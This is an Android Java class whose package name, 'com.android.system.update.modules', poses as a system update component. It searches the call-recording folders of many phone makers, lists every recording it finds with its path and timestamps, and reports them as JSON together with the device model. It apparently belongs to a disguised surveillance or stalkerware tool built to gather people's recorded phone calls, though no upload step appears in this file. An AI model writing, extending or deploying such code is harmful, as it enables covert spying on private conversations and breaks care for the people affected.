package com.android.system.update.modules;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class CallRecordingModule {
    private static final String TAG = "CallRecordingModule";

    // ── All known manufacturer call recording folders ─────────────────────────
    // These are where built-in dialers save their recordings.
    private static final String[] SCAN_PATHS = {
        // Samsung (One UI)
        "/storage/emulated/0/Recordings/Call/",
        "/storage/emulated/0/Call/",
        "/storage/emulated/0/Sounds/CallRecordings/",

        // Xiaomi / Redmi / POCO (MIUI)
        "/storage/emulated/0/MIUI/sound_recorder/call_rec/",
        "/storage/emulated/0/MIUI/sound_recorder/",

        // Huawei / Honor
        "/storage/emulated/0/Recordings/Call/",
        "/storage/emulated/0/CallRecord/",

        // Oppo / Realme / OnePlus (ColorOS / OxygenOS)
        "/storage/emulated/0/CallRecordings/",
        "/storage/emulated/0/Recordings/",

        // Vivo (OriginOS / FuntouchOS)
        "/storage/emulated/0/Record/",
        "/storage/emulated/0/CallRecord/",

        // Tecno / Infinix / Itel (HiOS)
        "/storage/emulated/0/Recorder/",
        "/storage/emulated/0/CallRecorder/",

        // Generic / fallback
        "/storage/emulated/0/PhoneRecord/",
        "/storage/emulated/0/Phone/CallRecordings/",
        "/storage/emulated/0/My Files/Call/",
    };

    private static final String[] AUDIO_EXTENSIONS = {
        ".mp3", ".mp4", ".m4a", ".3gp", ".amr", ".wav", ".aac", ".ogg", ".opus"
    };

    private final Context context;

    public CallRecordingModule(Context context) {
        this.context = context;
        Log.d(TAG, "CallRecordingModule initialized on " + Build.MANUFACTURER + " " + Build.MODEL);
    }

    // ── Public API ────────────────────────────────────────────────────────────

    /**
     * Scans all known manufacturer folders and returns every audio file found.
     */
    public String getRecordings() {
        try {
            JSONArray recordingsArray = new JSONArray();
            List<File> found = new ArrayList<>();

            // Deduplicate paths before scanning
            List<String> scanned = new ArrayList<>();
            for (String path : SCAN_PATHS) {
                if (scanned.contains(path)) continue;
                scanned.add(path);

                File dir = new File(path);
                if (!dir.exists() || !dir.isDirectory()) continue;

                Log.d(TAG, "Scanning: " + path);
                File[] files = dir.listFiles();
                if (files == null) continue;

                for (File file : files) {
                    if (file.isFile() && isAudioFile(file.getName())) {
                        found.add(file);
                        Log.d(TAG, "Found: " + file.getName() + " (" + file.length() + " bytes)");
                    }
                }
            }

            // Sort newest first
            Collections.sort(found, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));

            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
            for (File file : found) {
                JSONObject fileInfo = new JSONObject();
                fileInfo.put("name",                 file.getName());
                fileInfo.put("path",                 file.getAbsolutePath());
                fileInfo.put("size",                 file.length());
                fileInfo.put("lastModified",         file.lastModified());
                fileInfo.put("lastModifiedFormatted", sdf.format(new Date(file.lastModified())));
                fileInfo.put("folder",               file.getParent());
                recordingsArray.put(fileInfo);
            }

            JSONObject result = new JSONObject();
            result.put("success",    true);
            result.put("recordings", recordingsArray);
            result.put("count",      recordingsArray.length());
            return result.toString();

        } catch (JSONException e) {
            Log.e(TAG, "getRecordings error", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    /**
     * Returns status info — just device info and folder scan summary.
     */
    public String getStatus() {
        try {
            JSONArray foldersFound = new JSONArray();
            int totalFiles = 0;

            List<String> scanned = new ArrayList<>();
            for (String path : SCAN_PATHS) {
                if (scanned.contains(path)) continue;
                scanned.add(path);

                File dir = new File(path);
                if (!dir.exists() || !dir.isDirectory()) continue;

                File[] files = dir.listFiles();
                int count = 0;
                if (files != null) {
                    for (File f : files) {
                        if (f.isFile() && isAudioFile(f.getName())) count++;
                    }
                }
                if (count > 0) {
                    JSONObject folder = new JSONObject();
                    folder.put("path",  path);
                    folder.put("count", count);
                    foldersFound.put(folder);
                    totalFiles += count;
                }
            }

            JSONObject status = new JSONObject();
            status.put("success",      true);
            status.put("manufacturer", Build.MANUFACTURER);
            status.put("model",        Build.MODEL);
            status.put("totalFiles",   totalFiles);
            status.put("folders",      foldersFound);
            return status.toString();

        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private boolean isAudioFile(String name) {
        String lower = name.toLowerCase(Locale.US);
        for (String ext : AUDIO_EXTENSIONS) {
            if (lower.endsWith(ext)) return true;
        }
        return false;
    }

    public void cleanup() {
        // Nothing to clean up — no active recorders
    }
}
